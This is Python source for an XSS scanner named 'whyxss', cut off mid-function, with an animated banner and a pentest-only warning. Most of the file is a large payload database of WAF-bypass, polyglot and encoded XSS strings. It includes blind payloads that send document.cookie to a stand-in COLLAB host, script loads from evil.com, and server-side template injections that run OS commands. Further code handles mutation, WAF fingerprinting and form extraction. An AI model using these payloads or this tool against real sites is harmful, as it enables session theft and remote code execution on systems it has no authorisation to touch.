#!/usr/bin/env python3
"""
whyxss — XSS Scanner
XSStrike-level detection, whyasd-style UI
Acid green dripping banner
"""

import sys
import os
import re
import time
import random
import string
import threading
import argparse
import json
import urllib.parse
from datetime import datetime
from itertools import cycle

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

# ── ANSI ─────────────────────────────────────────────────────────────────────
# Acid green palette
AG  = '\033[38;2;0;255;0m'        # pure acid green
AG2 = '\033[38;2;57;255;20m'      # lime
AG3 = '\033[38;2;100;255;50m'     # light acid
AG4 = '\033[38;2;0;200;0m'        # darker green
AG5 = '\033[38;2;180;255;0m'      # yellow-green
DRK = '\033[38;2;0;100;0m'        # dark drip
R   = '\033[0;31m'
Y   = '\033[1;33m'
W   = '\033[1;37m'
GR  = '\033[0;90m'
DIM = '\033[2m'
BO  = '\033[1m'
BLK = '\033[40m'
RST = '\033[0m'
BLINK = '\033[5m'

VERSION = "1.0.0"

# ── Dripping acid animation ───────────────────────────────────────────────────
DRIP_CHARS = ['|', '¦', ':', '!', 'i', '.', ',', ' ']

def drip_color(ch, pos, frame):
    """Color a character based on position and animation frame"""
    colors = [AG, AG2, AG3, AG4, AG5, DRK, AG, AG2]
    idx = (pos + frame) % len(colors)
    return colors[idx] + ch + RST

def animate_drip_line(line, delay=0.003):
    """Print a line character by character with acid drip effect"""
    colors = [AG, AG2, AG3, AG5, AG4, AG2, AG, AG3]
    for i, ch in enumerate(line):
        c = colors[i % len(colors)]
        sys.stdout.write(c + ch + RST)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def show_drips(width=58, rows=2):
    """Animated drip drops falling down"""
    drip_cols = random.sample(range(5, width-5), min(15, width//4))
    drip_chars_per_col = {c: random.choice(['|','¦',':','!','i']) for c in drip_cols}
    
    for row in range(rows):
        line = ''
        for col in range(width):
            if col in drip_cols:
                intensity = random.random()
                if intensity > 0.6:
                    ch = drip_chars_per_col[col]
                    if intensity > 0.85:
                        line += AG + ch + RST
                    elif intensity > 0.7:
                        line += AG4 + ch + RST
                    else:
                        line += DRK + ch + RST
                else:
                    line += ' '
            else:
                line += ' '
        print('  ' + line)
        time.sleep(0.04)

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')

    # Acid drip top
    show_drips(width=62, rows=3)

    logo_lines = [
        "  ██╗    ██╗██╗  ██╗██╗   ██╗██╗  ██╗███████╗███████╗",
        "  ██║    ██║██║  ██║╚██╗ ██╔╝╚██╗██╔╝██╔════╝██╔════╝",
        "  ██║ █╗ ██║███████║ ╚████╔╝  ╚███╔╝ ███████╗███████╗",
        "  ██║███╗██║██╔══██║  ╚██╔╝   ██╔██╗ ╚════██║╚════██║",
        "  ╚███╔███╔╝██║  ██║   ██║   ██╔╝ ██╗███████║███████║",
        "   ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝",
    ]

    logo_colors = [AG, AG2, AG3, AG5, AG4, AG]

    for i, line in enumerate(logo_lines):
        animate_drip_line(line, delay=0.002)
        time.sleep(0.03)

    # Drips under logo
    show_drips(width=62, rows=2)

    # Separator with drip effect
    sep_chars = list('─' * 58)
    for i in range(0, len(sep_chars), 3):
        sep_chars[i] = random.choice(['╌','┄','─','╍'])
    print('  ' + AG4 + ''.join(sep_chars) + RST)

    print()

    # Tagline — drip print
    tagline = "  [ XSS Scanner — XSStrike-level detection ]"
    animate_drip_line(tagline, delay=0.004)

    # Version line
    print(f"  {DRK}Version:{RST} {AG}{VERSION}{RST}   {DRK}Engine:{RST} {AG2}polyglot+fuzzer+DOM{RST}")
    print()

    # WARNING line with blinking
    warn = "  ⚠  ТОЛЬКО ДЛЯ ПЕНТЕСТА — ИНАЧЕ ВЫСТРЕЛ В СПИНУ  ⚠"
    sys.stdout.write('  ')
    for ch in warn.strip():
        c = random.choice([R, Y, AG5])
        sys.stdout.write(BO + c + ch + RST)
        sys.stdout.flush()
        time.sleep(0.006)
    print()
    print()

    # Config output like pspy
    configs = [
        f"Config: Loading XSS payload database (polyglot+fuzzer) ...",
        f"Config: DOM analyzer: enabled",
        f"Config: Blind XSS detection: enabled",
        f"Config: WAF fingerprinting: enabled",
        f"Config: Encoding engines: HTML/URL/JS/Unicode/Hex",
    ]
    for line in configs:
        sys.stdout.write('  ')
        for ch in line:
            sys.stdout.write(AG4 + ch + RST)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        time.sleep(0.03)

    print()
    print('  ' + AG4 + '─' * 58 + RST)
    print()
    time.sleep(0.2)

# ── Shot animation (выстрел) ──────────────────────────────────────────────────
def shot_animation(target):
    """Animated 'ВЫСТРЕЛ' when scanning starts"""
    frames_pre = [
        f"  {AG4}[  цель захвачена  ]{RST}  {GR}{target[:50]}{RST}",
        f"  {AG}[ прицеливание... ]{RST}  {GR}{target[:50]}{RST}",
        f"  {AG2}[ готов к выстрелу]{RST}  {GR}{target[:50]}{RST}",
    ]
    for f in frames_pre:
        print(f'\r' + f, end='', flush=True)
        time.sleep(0.25)

    print()

    # ВЫСТРЕЛ text with explosion
    shot_text = "  💥  В Ы С Т Р Е Л  💥"
    colors_cycle = [AG, AG2, AG3, AG5, AG4, R, Y, AG]
    sys.stdout.write('\n')
    for i, ch in enumerate(shot_text):
        c = colors_cycle[i % len(colors_cycle)]
        sys.stdout.write(BO + c + ch + RST)
        sys.stdout.flush()
        time.sleep(0.04)
    print()

    # Muzzle flash
    for _ in range(3):
        print(f'\r  {AG}{BO}' + '█' * random.randint(10,30) + RST, end='', flush=True)
        time.sleep(0.06)
        print(f'\r  {AG4}' + '▓' * random.randint(5,20) + RST + ' ' * 30, end='', flush=True)
        time.sleep(0.06)

    print(f'\r' + ' ' * 60)
    print()

# ── Payload database ──────────────────────────────────────────────────────────
# XSStrike-level payloads: polyglots, bypasses, DOM, blind
PAYLOADS = {
    "basic": [
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        "<script>alert('XSS')</script>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '</script><script>alert(1)</script>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script/src=//evil.com/x.js>',
        '<script>alert(document.domain)</script>',
        '<script>alert(document.cookie)</script>',
        '"><script>alert(document.domain)</script>',
        "';alert(1)//",
        '";alert(1)//',
        '</title><script>alert(1)</script>',
        '</textarea><script>alert(1)</script>',
        '</style><script>alert(1)</script>',
        '--><script>alert(1)</script>',
        ']]><script>alert(1)</script>',
        '<script>alert(1)//\n</script>',
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        '<img src=x onerror="&#x61;lert(1)">',
        '"><<img src=x onerror=alert(1)>//',
        '<svg/onload=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '\'"--><img src=x onerror=alert(1)>',
        '"-prompt(1)-"',
        "';confirm(1)//",
        '<script>/*</script><script>*/alert(1)//</script>',
        '<!--<img src="--><img src=x onerror=alert(1)//">',
        '<isindex type=image src=1 onerror=alert(1)>',
        '<isindex action=javascript:alert(1) type=image>',
        '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">',
        '<iframe src=javascript:alert(1)>',
        '`"><img src=x onerror=alert(1)>',
        '"-alert(1)-"',
        "'-alert(1)-'",
        '"+alert(1)+"',
        "'+alert(1)+'",
    ],
    "event_handlers": [
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert`1`>',
        '<img src=1 onerror=alert(1)>',
        '<img/src=x onerror=alert(1)>',
        '<img src=x onerror="alert(1)">',
        "<img src=x onerror='alert(1)'>",
        '<img src=x onerror=alert(1) x>',
        '<video src=x onerror=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<audio><source onerror=alert(1)>',
        '<body onload=alert(1)>',
        '<body onpageshow=alert(1)>',
        '<body onfocus=alert(1)>',
        '<body onhashchange=alert(1)><a href=#>click',
        '<input onfocus=alert(1) autofocus>',
        '<input onblur=alert(1) autofocus><input autofocus>',
        '<input oninput=alert(1) autofocus>',
        '<input onmouseover=alert(1)>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<iframe onload=alert(1) src=about:blank>',
        '<object data="javascript:alert(1)">',
        '<a href=javascript:alert(1)>click</a>',
        '<a href="javascript:alert(1)">XSS</a>',
        "<a href='javascript:alert(1)'>XSS</a>",
        '<div onmouseover=alert(1)>hover</div>',
        '<div onclick=alert(1)>click</div>',
        '<marquee onstart=alert(1)>',
        '<marquee loop=1 onfinish=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<details ontoggle=alert(1) open>x',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '<math onmouseover=alert(1)><mi>',
        '<button onclick=alert(1)>click</button>',
        '<form onsubmit=alert(1)><input type=submit>',
        '<link rel=stylesheet href=x onload=alert(1)>',
        '<style onload=alert(1)>*{}</style>',
        '<bgsound src=x onerror=alert(1)>',
    ],
    "waf_bypass": [
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script >alert(1)</script >',
        '<script\t>alert(1)</script>',
        '<script\n>alert(1)</script>',
        '<script\r>alert(1)</script>',
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        '<script>al\u0065rt(1)</script>',
        '%3cscript%3ealert(1)%3c%2fscript%3e',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '<img src=x onerror=\u0061lert(1)>',
        '<svg><script>alert&#40;1&#41;</script>',
        '<svg><script>alert(1)</script></svg>',
        '<iframe src="data:text/html,<script>alert(1)</script>">',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
        '<<script>alert(1)//<</script>',
        '<svg><script>&#97;lert(1)</script></svg>',
        '<IMG SRC=x OnErRoR=alert(1)>',
        '<IMG SRC=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        '<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
        '<iframe/onload=alert(1)>',
        '<a href="jAvAsCrIpT:alert(1)">xss</a>',
        '<a href="javascript&#58;alert(1)">xss</a>',
        '<a href="javascript&#x3A;alert(1)">xss</a>',
        '<a href="&#106;avascript:alert(1)">xss</a>',
        '<a href="java&#9;script:alert(1)">xss</a>',
        '<a href="java&#10;script:alert(1)">xss</a>',
        '<a href="java&#13;script:alert(1)">xss</a>',
        '<img src=x onerror=window["alert"](1)>',
        '<img src=x onerror=self["alert"](1)>',
        '<img src=x onerror=(alert)(1)>',
        '<script>window["ale"+"rt"](1)</script>',
        '<script>eval("al"+"ert(1)")</script>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<script>Function("alert(1)")()</script>',
        '<script>setTimeout("alert(1)",0)</script>',
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        '<svg onload=setTimeout`alert\x281\x29`>',
    ],
    "dom": [
        'javascript:alert(1)',
        'javascript:alert(document.cookie)',
        'javascript:alert(document.domain)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        '#"><img src=x onerror=alert(1)>',
        '"-alert(1)-"',
        "'-alert(1)-'",
        '`-alert(1)-`',
        ';alert(1)//',
        '};alert(1)//',
        '</script><script>alert(1)</script>',
        '"+alert(1)+"',
        "'+alert(1)+'",
        '${alert(1)}',
        '#{alert(1)}',
        '<img src=x onerror=alert(1)>',
        'javascript:/*--></title></style></textarea></script><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        '\\";\nalert(1)//',
        '\\\';alert(1)//',
    ],
    "blind": [
        '<script>new Image().src="http://COLLAB/?c="+document.cookie</script>',
        '<img src=x onerror="fetch(\'http://COLLAB/?c=\'+btoa(document.cookie))">',
        "<script>document.write('<img src=http://COLLAB/?c='+document.cookie+'>')</script>",
        '"><script src=http://COLLAB/xss.js></script>',
        "<input type=hidden name=xss value='<script>alert(1)</script>'>",
        '<script>var i=new Image;i.src="http://COLLAB/?c="+document.cookie;</script>',
        '<script>new Audio("http://COLLAB/?c="+document.cookie)</script>',
        '<link rel=dns-prefetch href=//COLLAB>',
        '<svg onload="fetch(\'http://COLLAB/?\'+document.cookie)">',
        '<script>navigator.sendBeacon("http://COLLAB",document.cookie)</script>',
        "<script>fetch('http://COLLAB/?c='+btoa(document.cookie))</script>",
        "<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://COLLAB/?c='+document.cookie);xhr.send();</script>",
    ],
    "attr_break": [
        '" onmouseover="alert(1)"',
        "' onmouseover='alert(1)'",
        '" autofocus onfocus="alert(1)"',
        "' autofocus onfocus='alert(1)'",
        '" onclick="alert(1)"',
        '`onmouseover=`alert(1)',
        '" style="animation-name:spinning" onanimationstart="alert(1)"',
        '" onmouseenter="alert(1)"',
        '" onpointerenter="alert(1)"',
        "' onclick='alert(1)'",
        '" tabindex=1 onfocus="alert(1)"',
        "' tabindex=1 onfocus='alert(1)'",
        '" onkeyup="alert(1)"',
        "' onkeyup='alert(1)'",
        '" ondblclick="alert(1)"',
        "' ondblclick='alert(1)'",
        '" oncontextmenu="alert(1)"',
        '" onwheel="alert(1)"',
        '" onauxclick="alert(1)"',
        '" oncut=alert(1) contenteditable "',
        "' onpaste=alert(1) contenteditable '",
        "') alert(1) //",
        '")) alert(1) //',
    ],
    "template_injection": [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '*{7*7}',
        "{{constructor.constructor('alert(1)')()}}",
        "${{<%[%'\"}}%\\.",
        '{{alert(1)}}',
        '{alert(1)}',
        '<%=alert(1)%>',
        '<%= alert(1) %>',
        "{{7*'7'}}",
        '{{config}}',
        '{{config.items()}}',
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    ],
    "svg": [
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '<svg onload="alert(1)">',
        "<svg onload='alert(1)'>",
        '<svg onload=alert(1) xmlns=http://www.w3.org/2000/svg>',
        '<svg><script>alert(1)</script></svg>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<svg><set onbegin=alert(1) attributeName=x>',
        '<svg><image href="x" onerror="alert(1)"/>',
        '<svg><foreignObject><script>alert(1)</script></foreignObject>',
        '<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><rect width=100 height=100/></a>',
    ],
    "html5": [
        '<video onloadstart=alert(1) src=x>',
        '<video controls onplay=alert(1)><source src=x></video>',
        '<audio autoplay onplay=alert(1)><source src=x></audio>',
        '<track onload=alert(1)>',
        '<source onerror=alert(1)>',
        '<details ontoggle=alert(1) open>',
        '<dialog open onclose=alert(1)>',
        '<meter onmouseover=alert(1)>0</meter>',
        '<output onmouseover=alert(1)>click</output>',
        '<progress onmouseover=alert(1)>',
        '<time onmouseover=alert(1)>',
        '<fieldset onfocus=alert(1) tabindex=1>',
    ],
    "css": [
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<style>@import"javascript:alert(1)"</style>',
        '<div style="background:url(javascript:alert(1))">',
        '<link rel=stylesheet href=javascript:alert(1)>',
        '<style>*{x:expression(alert(1))}</style>',
        '<xss style="xss:expression(alert(1))">',
    ],
    "encoding": [
        '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
        '%3Cimg+src%3Dx+onerror%3Dalert(1)%3E',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        '\u003cscript\u003ealert(1)\u003c/script\u003e',
        '<script>eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29")</script>',
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        '<svg onload=eval(atob("YWxlcnQoMSk="))>',
        '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
    ],
    "filter_bypass": [
        '<SCRIPT>alert(1)</SCRIPT>',
        '<Script>alert(1)</Script>',
        '<scrIPT>alert(1)</scrIPT>',
        '<script/type="text/javascript">alert(1)</script>',
        '<script language="javascript">alert(1)</script>',
        '"-confirm(1)-"',
        "'-confirm(1)-'",
        '"-prompt(1)-"',
        "'-prompt`1`-'",
        '<img src=x onerror=confirm(1)>',
        '<img src=x onerror=prompt(1)>',
        '<svg onload=confirm(1)>',
        '<svg onload=prompt(1)>',
        '"><img src=x onerror=prompt(1)>',
        "'><<img src=x onerror=confirm(1)>",
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<svg onload=alert(String.fromCharCode(88,83,83))>',
    ],
    "angular": [
        '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("alert(1)")()}}',
        '{{[].pop.constructor("alert(1)")()}}',
        '<div ng-app>{{constructor.constructor(\'alert(1)\')()}}</div>',
        '{{{}["constructor"]["constructor"]("alert(1)")()}}',
        '{{7*7}}',
        '{{7*"7"}}',
        "{{''['constructor']['constructor']('alert(1)')()}}",
    ],
    "mutation": [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<p id="</p><img src=x onerror=alert(1)>">',
        '<embed src="javascript:alert(1)">',
        '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        '<object type="text/x-scriptlet" data="http://example.com/xss.sct">',
        '<?xml-stylesheet type="text/xsl" href="javascript:alert(1)"?>',
        '<p><svg><title></title><g onload=alert(1)>',
        '<img src=javascript:alert(1)>',
        '<table background=javascript:alert(1)>',
        '<td background=javascript:alert(1)>',
        '<base href=javascript:/a/-alert(1)///////..>',
    ],
}

# ── Mutation engine ───────────────────────────────────────────────────────────
import re as _re

def mutate_payload(payload):
    mutations = []

    def _rand_case(s):
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    # Case variation on tag names
    mutations.append(_re.sub(r'<(\w+)', lambda m: '<' + _rand_case(m.group(1)), payload))

    # Null bytes
    for tag in ('script', 'img', 'svg', 'iframe'):
        if f'<{tag}' in payload.lower():
            mutations.append(payload.lower().replace(f'<{tag}', f'<{tag[:2]}\x00{tag[2:]}'))

    # Tab/newline in tags
    mutations.append(payload.replace('<img ', '<img\t').replace('<svg ', '<svg\n').replace('<script>', '<script\n>'))

    # URL encode angle brackets
    mutations.append(payload.replace('<', '%3c').replace('>', '%3e'))

    # HTML entity encode angle brackets
    mutations.append(payload.replace('<', '&#x3c;').replace('>', '&#x3e;'))

    # HTML comment in script tag
    mutations.append(payload.replace('<script>', '<scr<!---->ipt>').replace('</script>', '</scr<!---->ipt>'))

    # Event handler case variations
    for ev in ('onerror', 'onload', 'onclick', 'onfocus', 'onmouseover'):
        if ev in payload:
            mutations.append(payload.replace(ev, ev.upper()))
            mutations.append(payload.replace(ev, _rand_case(ev)))

    # Backtick for alert
    mutations.append(payload.replace('alert(1)', 'alert`1`'))
    mutations.append(payload.replace('alert(1)', 'confirm(1)'))
    mutations.append(payload.replace('alert(1)', 'prompt(1)'))

    # Unicode escape on alert
    mutations.append(payload.replace('alert', '\u0061lert'))
    mutations.append(payload.replace('alert', 'al\u0065rt'))

    # Self-closing slash
    mutations.append(payload.replace('<img ', '<img/').replace('<svg ', '<svg/'))

    # String.fromCharCode encoding of alert(1)
    mutations.append(payload.replace('alert(1)', 'eval(String.fromCharCode(97,108,101,114,116,40,49,41))'))

    # atob encoding
    mutations.append(payload.replace('alert(1)', 'eval(atob("YWxlcnQoMSk="))'))

    return [m for m in mutations if m and m != payload]

# ── Build ALL_PAYLOADS with auto-mutations ────────────────────────────────────
ALL_PAYLOADS = []
_seen_payloads = set()

def _add_payload(payload, category):
    if payload not in _seen_payloads and payload.strip():
        _seen_payloads.add(payload)
        ALL_PAYLOADS.append({'payload': payload, 'category': category})

for _cat, _plist in PAYLOADS.items():
    for _p in _plist:
        _add_payload(_p, _cat)
        if _cat in ('basic', 'event_handlers', 'waf_bypass', 'svg', 'html5', 'filter_bypass'):
            for _mut in mutate_payload(_p):
                _add_payload(_mut, _cat + '_mut')

# ── WAF signatures ────────────────────────────────────────────────────────────
WAF_SIGNATURES = {
    'Cloudflare':    ['cloudflare', '__cfduid', 'cf-ray', 'cloudflare-nginx'],
    'ModSecurity':   ['mod_security', 'modsecurity', 'NOYB'],
    'Sucuri':        ['sucuri', 'x-sucuri-id', 'cloudproxy'],
    'Akamai':        ['akamai', 'ak_bmsc', 'akamai-ghost'],
    'Imperva':       ['imperva', 'incapsula', 'visid_incap'],
    'F5 Big-IP':     ['f5-bigip', 'ts', 'BigIP'],
    'AWS WAF':       ['aws-waf', 'x-amzn-requestid'],
    'Barracuda':     ['barra_counter_session', 'BNI__BARRACUDA_LB_COOKIE'],
    'Fortinet':      ['FORTIWAFSID', 'cookiesession1'],
    'Wordfence':     ['wordfence', 'wfvt_'],
    'DotDefender':   ['X-dotDefender-denied'],
}

# ── Encoding helpers ──────────────────────────────────────────────────────────
def url_encode(payload):
    return urllib.parse.quote(payload, safe='')

def double_url_encode(payload):
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

def html_encode(payload):
    result = ''
    for ch in payload:
        result += f'&#{ord(ch)};'
    return result

def hex_encode(payload):
    result = ''
    for ch in payload:
        result += f'\\x{ord(ch):02x}'
    return result

def unicode_encode(payload):
    result = ''
    for ch in payload:
        result += f'\\u{ord(ch):04x}'
    return result

def generate_mutations(payload):
    mutations = [payload]
    # Case variation
    mutations.append(payload.swapcase())
    # Double encode
    mutations.append(double_url_encode(payload))
    # Null bytes
    mutations.append(payload.replace('<', '<%00'))
    # Comment injection
    mutations.append(payload.replace('<script>', '<scr<!---->ipt>'))
    # Tab/newline
    mutations.append(payload.replace(' ', '\t'))
    return list(set(mutations))

# ── HTTP session ──────────────────────────────────────────────────────────────
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
}

def make_session(cookies='', proxy=''):
    s = requests.Session()
    s.headers.update(HEADERS)
    s.verify = False
    if cookies:
        for pair in cookies.split(';'):
            pair = pair.strip()
            if '=' in pair:
                k, v = pair.split('=', 1)
                s.cookies.set(k.strip(), v.strip())
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    return s

# ── WAF detection ─────────────────────────────────────────────────────────────
def detect_waf(session, url):
    found = []
    try:
        # Send a known bad payload to trigger WAF
        test_url = url + ('&' if '?' in url else '?') + 'xss=<script>alert(1)</script>'
        r = session.get(test_url, timeout=8)
        headers_str = str(r.headers).lower()
        body_str = r.text.lower()
        cookies_str = str(r.cookies).lower()

        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in headers_str or sig.lower() in cookies_str:
                    found.append(waf_name)
                    break

        if r.status_code in (403, 406, 429, 503):
            found.append(f'Unknown WAF (HTTP {r.status_code})')

    except Exception:
        pass
    return list(set(found))

# ── Form/param extraction ─────────────────────────────────────────────────────
def extract_forms(session, url):
    forms = []
    try:
        r = session.get(url, timeout=10)
        if not BS4_OK:
            return forms
        soup = BeautifulSoup(r.text, 'html.parser')
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            inputs = []
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name', '')
                itype = inp.get('type', 'text')
                val = inp.get('value', '')
                if name:
                    inputs.append({'name': name, 'type': itype, 'value': val})
            if inputs:
                forms.append({
                    'action': urllib.parse.urljoin(url, action),
                    'method': method,
                    'inputs': inputs
                })
    except Exception as e:
        pass
    return forms

def extract_params(url):
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return {k: v[0] for k, v in params.items()}

def build_url_with_param(url, param, value):
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urllib.parse.urlencode(params, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))

# ── Reflection analysis ───────────────────────────────────────────────────────
def check_reflection(response_text, payload, token):
    """Check if payload or token appears in response"""
    if token and token in response_text:
        return True, 'token_reflected'
    if payload in response_text:
        return True, 'raw_reflected'
    # Partial checks
    dangerous_parts = ['<script', 'onerror=', 'onload=', 'javascript:', 'alert(', 'svg']
    for part in dangerous_parts:
        if part.lower() in response_text.lower():
            return True, f'partial:{part}'
    return False, ''

def analyze_context(html, token):
    """Find where token appears in HTML context"""
    if not token or token not in html:
        return 'not_found'
    idx = html.find(token)
    before = html[max(0, idx-100):idx]
    after = html[idx:idx+100]
    ctx = before + '[TOKEN]' + after
    if re.search(r'<script[^>]*>[^<]*\[TOKEN\]', ctx, re.I | re.S):
        return 'script_body'
    if re.search(r'<[^>]*=\s*["\']?[^"\']*\[TOKEN\]', ctx, re.I):
        return 'attr_value'
    if re.search(r'<[^>]*\[TOKEN\]', ctx, re.I):
        return 'tag_body'
    if '<!--' in before and '-->' in after:
        return 'html_comment'
    return 'html_body'

# ── DOM analysis ──────────────────────────────────────────────────────────────
DOM_SINKS = [
    'document.write', 'innerHTML', 'outerHTML', 'insertAdjacentHTML',
    'eval(', 'setTimeout(', 'setInterval(', 'Function(',
    'location.href', 'location.assign', 'location.replace',
    'document.URL', 'document.documentURI', 'document.referrer',
]
DOM_SOURCES = [
    'location.hash', 'location.search', 'location.href',
    'document.cookie', 'document.referrer', 'window.name',
]

def analyze_dom(html):
    found_sinks = []
    found_sources = []
    for sink in DOM_SINKS:
        if sink.lower() in html.lower():
            found_sinks.append(sink)
    for src in DOM_SOURCES:
        if src.lower() in html.lower():
            found_sources.append(src)
    return found_sinks, found_sources

# ── Confidence scoring ────────────────────────────────────────────────────────
def score_finding(reflection_type, context, status_code):
    score = 0
    if reflection_type == 'token_reflected':
        score += 40
    elif reflection_type == 'raw_reflected':
        score += 60
    elif 'partial' in reflection_type:
        score += 30

    ctx_scores = {
        'script_body': 40, 'attr_value': 30, 'html_body': 20,
        'tag_body': 25, 'html_comment': 10, 'not_found': 0
    }
    score += ctx_scores.get(context, 0)

    if status_code == 200:
        score += 10
    return min(score, 100)

# ── Core scanning ─────────────────────────────────────────────────────────────
class Finding:
    def __init__(self, url, param, payload, category, context, confidence, reflection):
        self.url = url
        self.param = param
        self.payload = payload
        self.category = category
        self.context = context
        self.confidence = confidence
        self.reflection = reflection
        self.timestamp = datetime.now().strftime('%H:%M:%S')

    def __str__(self):
        conf_color = AG if self.confidence >= 70 else (AG4 if self.confidence >= 40 else DRK)
        return (
            f"  {AG}[VULN]{RST} Param: {W}{self.param}{RST} | "
            f"Confidence: {conf_color}{self.confidence}%{RST} | "
            f"Context: {AG3}{self.context}{RST}\n"
            f"  {AG4}[PAY]{RST}  {DIM}{self.payload[:80]}{RST}\n"
            f"  {DRK}[CTX]{RST}  {GR}Category: {self.category} | Reflection: {self.reflection}{RST}"
        )

def sep(c='─', n=62, color=AG4):
    print(color + c * n + RST)

def dsep():
    print(AG + '═' * 62 + RST)

def log_info(msg):    print(f"  {AG}[*]{RST} {msg}")
def log_hit(msg):     print(f"  {AG2}{BO}[HIT]{RST} {msg}")
def log_warn(msg):    print(f"  {AG5}[!]{RST} {msg}")
def log_err(msg):     print(f"  {R}[-]{RST} {msg}")
def log_verbose(msg, v): 
    if v: print(f"  {DRK}[v]{RST} {GR}{msg}{RST}")

# ── Spinner for long tasks ─────────────────────────────────────────────────────
_spin_active = False
def spinner(label='Scanning'):
    frames = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
    i = 0
    while _spin_active:
        sys.stdout.write(f"\r  {AG}{frames[i % len(frames)]}{RST} {AG4}{label}...{RST}  ")
        sys.stdout.flush()
        i += 1
        time.sleep(0.08)
    sys.stdout.write(f"\r{' ' * 50}\r")
    sys.stdout.flush()

def start_spinner(label):
    global _spin_active
    _spin_active = True
    t = threading.Thread(target=spinner, args=(label,), daemon=True)
    t.start()
    return t

def stop_spinner():
    global _spin_active
    _spin_active = False
    time.sleep(0.1)

# ── Scan URL params ───────────────────────────────────────────────────────────
def scan_url_params(session, url, payloads, verbose=False, delay=0):
    findings = []
    params = extract_params(url)
    if not params:
        log_verbose("No URL params found", verbose)
        return findings

